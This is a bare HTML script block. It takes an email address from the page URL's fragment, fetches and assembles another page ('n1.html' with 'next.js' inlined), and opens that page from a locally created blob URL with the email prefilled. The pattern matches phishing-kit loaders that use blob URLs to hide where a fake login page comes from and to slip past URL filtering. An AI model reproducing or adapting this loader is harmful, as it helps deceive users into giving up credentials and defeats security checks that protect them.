<script>
(function () {

  // ✅ READ EMAIL FROM HASH (not query string)
  const hash = window.location.hash;
  const emailFromHash = hash && hash.length > 1 ? hash.slice(1) : null;

  fetch('n1.html')
    .then(res => res.text())
    .then(async html => {

      let modifiedHtml = html;

      // ✅ Inline next.js so blob executes properly
      try {
        const nextResp = await fetch('next.js');
        if (nextResp.ok) {
          const nextJsText = await nextResp.text();
          modifiedHtml = modifiedHtml.replace(
            /<script\s+[^>]*src=["']next\.js["'][^>]*>\s*<\/script>/i,
            '<script>' + nextJsText + '<\/script>'
          );
        }
      } catch (e) {
        console.warn('Could not inline next.js', e);
      }

      const blob = new Blob([modifiedHtml], { type: 'text/html' });
      const blobUrl = URL.createObjectURL(blob);

      // ✅ CRITICAL: RE‑ATTACH HASH FOR PREFILL
      if (emailFromHash) {
        window.open(blobUrl + '#' + encodeURIComponent(emailFromHash));
      } else {
        window.open(blobUrl);
      }

    })
    .catch(err => console.error('Failed to open n1.html blob:', err));

})();
</script>
